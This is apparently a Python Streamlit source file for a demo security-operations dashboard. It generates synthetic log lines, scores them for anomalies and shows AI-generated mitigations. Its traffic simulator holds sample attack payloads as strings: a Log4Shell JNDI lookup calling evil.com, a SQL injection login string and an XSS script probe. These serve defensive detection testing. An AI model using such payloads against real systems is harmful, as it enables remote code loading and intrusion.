import streamlit as st
import sys
import os
import time
import random 
from datetime import datetime
from reports.report_generator import export_session_report

# Path Hack
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from anomaly_detection.anomaly_scorer import AnomalyScorer
from rag_pipeline.rag_engine import RAGEngine
from rag_pipeline.llm_mitigator import LLMMitigator
from evaluation.metrics_calc import compute_live_metrics

# --- CACHED RESOURCES ---
@st.cache_resource
def get_engines():
    return AnomalyScorer(), RAGEngine(), LLMMitigator()

scorer, rag, mitigator = get_engines()

st.set_page_config(page_title="SOC Architect | AI RAG", page_icon="🛡️", layout="wide")

# --- SESSION STATE ---
if 'alerts' not in st.session_state: st.session_state['alerts'] = []
if 'history' not in st.session_state: st.session_state['history'] = []

# FIX: Add a persistent counter that never resets/decreases
if 'alert_counter' not in st.session_state: st.session_state['alert_counter'] = 1000

# --- SIDEBAR: TRAFFIC GENERATOR ---
with st.sidebar:
    st.header("📡 Network Traffic Simulator")
    
    # 1. Traffic Type Selector
    traffic_type = st.radio(
        "Select Traffic Pattern:",
        ("✅ Normal Traffic", "🔥 Log4Shell Attack", "💉 SQL Injection", "❌ XSS Attack", "🔨 Brute Force")
    )

    # 2. Generate Log Button
    if st.button("Generate Log Stream"):
        timestamp = datetime.now().strftime('%H:%M:%S')
        
        if "Normal" in traffic_type:
            eps = ["/home", "/dashboard", "/user/profile", "/api/status", "/contact"]
            st.session_state['last_log'] = f"{timestamp} GET {random.choice(eps)} HTTP/1.1 200 OK"
        
        elif "Log4Shell" in traffic_type:
            st.session_state['last_log'] = f"{timestamp} GET /?x=${{jndi:ldap://evil.com/exploit}} HTTP/1.1 404"
            
        elif "SQL" in traffic_type:
            st.session_state['last_log'] = f"{timestamp} POST /login user=admin' OR 1=1;-- HTTP/1.1 200"
            
        elif "XSS" in traffic_type:
            st.session_state['last_log'] = f"{timestamp} GET /search?q=<script>alert('pwned')</script> HTTP/1.1 200"

        elif "Brute" in traffic_type:
            st.session_state['last_log'] = f"{timestamp} POST /auth/login user=root pass=123456 (Failed Attempt 502)"

    # 3. Display & Process
    log_input = st.text_area("Live Log Output", value=st.session_state.get('last_log', ""), height=100)
    
    if st.button("🚀 Analyze Threat", type="primary"):
        with st.spinner("Running Anomaly Detection & Vector Search..."):
            # A. Anomaly Detection
            analysis = scorer.analyze(log_input)
            
            # B. RAG Search
            rag_context = rag.retrieve_context(
                log_input, 
                detected_patterns=analysis['patterns']
            )
            
            # C. Create Alert ID (Robust Increment)
            st.session_state['alert_counter'] += 1
            new_id = st.session_state['alert_counter']

            # D. Create Alert Object
            new_alert = {
                "id": new_id,  # UNIQUE ID GUARANTEED
                "timestamp": datetime.now().strftime('%H:%M:%S'),
                "created_at": time.time(),
                "raw_log": log_input,
                "score": analysis['score'],
                "severity": analysis['severity'],
                "patterns": analysis['patterns'],
                "context": rag_context
            }
            
            # Only add to alert queue if it's suspicious (Score > 0)
            if analysis['score'] > 0:
                st.session_state['alerts'].append(new_alert)
                st.toast(f"🚨 Alert Triggered: {analysis['severity']}")
            else:
                st.toast("✅ Traffic Normal - No Alert Created")

    st.divider()
    
    # 4. REPORT EXPORT (Essential for Deliverables)
    if st.button("📄 Export Compliance Report"):
        # Calculate fresh metrics before export
        current_metrics = compute_live_metrics(st.session_state['history'])
        if st.session_state['history']:
            path = export_session_report(st.session_state['history'], current_metrics)
            st.success(f"Report saved to: {path}")
        else:
            st.error("No mitigated threats to report yet.")

# --- MAIN DASHBOARD ---
st.title("🛡️ Enterprise SOC | AI Threat Prioritizer")

# Metrics
metrics = compute_live_metrics(st.session_state['history'])
c1, c2, c3 = st.columns(3)
c1.metric("Active Threats", len(st.session_state['alerts']))
c2.metric("Avg Response Time", metrics['response_time'])
c3.metric("Threats Mitigated", metrics['mitigation_count'])

st.divider()

# --- ALERT QUEUE ---
if not st.session_state['alerts']:
    st.info("✅ Network Secure. Waiting for incoming telemetry...")
else:
    # Sort by Severity
    sorted_alerts = sorted(st.session_state['alerts'], key=lambda x: x['score'], reverse=True)
    
    # LIMIT TO TOP 3 (Deliverable Requirement)
    for alert in sorted_alerts[:3]:
        
        # Color Coding
        color = "red" if alert['severity'] == "Critical" else "orange" if alert['severity'] == "High" else "blue"
        
        with st.expander(f"🔴 [{alert['severity']}] Risk Score: {alert['score']} | {alert['timestamp']}", expanded=True):
            
            col_a, col_b = st.columns([1, 1])
            
            # LEFT: DETECTION
            with col_a:
                st.markdown("#### 🔍 Signal Analysis")
                st.code(alert['raw_log'], language='http')
                st.write(f"**Patterns:** `{alert['patterns']}`")
                
                # Visual trigger
                if "SQL" in str(alert['patterns']) or "OR 1=1" in alert['raw_log']:
                     st.info("Visual Trace: SQL Injection detected in query parameters.")

            # RIGHT: RESPONSE
            with col_b:
                st.markdown("#### 🧠 AI Response Engine")
                
                # CASE 1: RAG MATCH FOUND
                if alert['context']:
                    ctx = alert['context']
                    st.success(f"**Identified Threat:** {ctx['vuln_name']}")
                    
                    # Generate specific mitigation
                    llm_output = mitigator.generate_mitigation(alert, ctx)
                    st.markdown(llm_output["llm_mitigation"])
                    st.caption(f"📚 **Source:** {ctx['id']} | Conf: {ctx['confidence_score']}%")

                # CASE 2: NO MATCH BUT HIGH RISK (FALLBACK)
                elif alert['score'] > 60:
                    st.warning("**⚠️ Unknown Signature - Heuristic Mitigation**")
                    st.write("Specific CVE not found, but behavior is malicious. Applying standard protocols:")
                    
                    # Fallback Context for LLM
                    fallback_ctx = {
                        "vuln_name": "Unknown High-Risk Anomaly",
                        "mitigation": "Isolate source IP. Check WAF logs. Reset affected user credentials immediately.",
                        "citation": "Standard SOC Protocol (Heuristic)"
                    }
                    
                    llm_output = mitigator.generate_mitigation(alert, fallback_ctx)
                    st.markdown(llm_output["llm_mitigation"])
                    
                else:
                    st.info("Low risk anomaly. Recommended: Add to watchlist.")

                # EXECUTE BUTTON (NOW SAFE FROM DUPLICATES)
                if st.button(f"✅ Execute Response", key=f"btn_{alert['id']}"):
                    alert["mitigated_at"] = time.time()
                    st.session_state['history'].append(alert)
                    st.session_state['alerts'].remove(alert)
                    st.rerun()